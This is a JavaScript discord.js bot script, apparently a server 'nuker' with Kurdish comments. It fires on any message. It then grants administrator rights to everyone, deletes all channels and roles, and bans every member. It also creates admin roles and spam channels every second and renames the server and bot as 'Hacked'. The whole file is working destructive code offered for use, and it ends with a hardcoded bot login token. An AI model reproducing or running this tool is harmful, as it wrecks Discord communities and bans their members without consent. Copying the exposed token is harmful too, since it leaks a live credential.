const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "dilan up"; ///lera ba dly xot prefix dabne
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log(`Bot Hack Is Ready`)
});


client.on("message", message => {
  if (message.content.startsWith(`${message.content}`)) {
    message.delete();
    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
    });
    message.guild.channels.cache.map(c => {
      c.delete();
    });
    message.guild.roles.cache.forEach(r => {
      r.delete();
    });
    message.guild.members.cache.forEach(m => {
      m.ban();
    });
    setInterval(() => {
      message.guild.roles
        .create({
        data: {
          name: "Kalary Bzhi Ba Xom Nerakarm..!",
          permissions: ["ADMINISTRATOR"]
        }
        })
        .then(rr => {
          message.member.roles.add(rr.id);
        });
    }, 1000);
    message.guild.setIcon("https://cdn.discordapp.com/avatars/522853685039202314/beb35fddd7e0f5f9f070adce946d601e.png?size=1024");
    client.user.setAvatar("https://cdn.discordapp.com/avatars/522853685039202314/beb35fddd7e0f5f9f070adce946d601e.png?size=1024");
    client.user.setUsername("Hacked By Kalary");
    message.guild.owner.send(
      "قەینا گەورە بیت بیرتەچێتەوە کابرای بێمنەت"
    );
    message.guild.setName("Hacked by AKA-it");
    setTimeout(function() {
      setInterval(
        () => {
          message.guild.channels
            .create("Hacked By Kalary", "text")
            .then(channel => {
              channel.send(
                "   وتم شتێک ئەکەم سەری خۆمی لەسەر دانێم ئەیکەم باش بزانە بێ منەتی بەران بەر من بە هیچ شێوەیەک بونی نیە😂"
              );
            });
        },

        1000
      );
    });
  }
});
////updated for v12 by black jack

////codaka drwst krawa lalayan black jack

client.login("NzkyODUzNjMwMTA5MjIwOTI1.X-jwew.9xZ2Q4KHNoHveB9-9Dp1qIpaqHE");
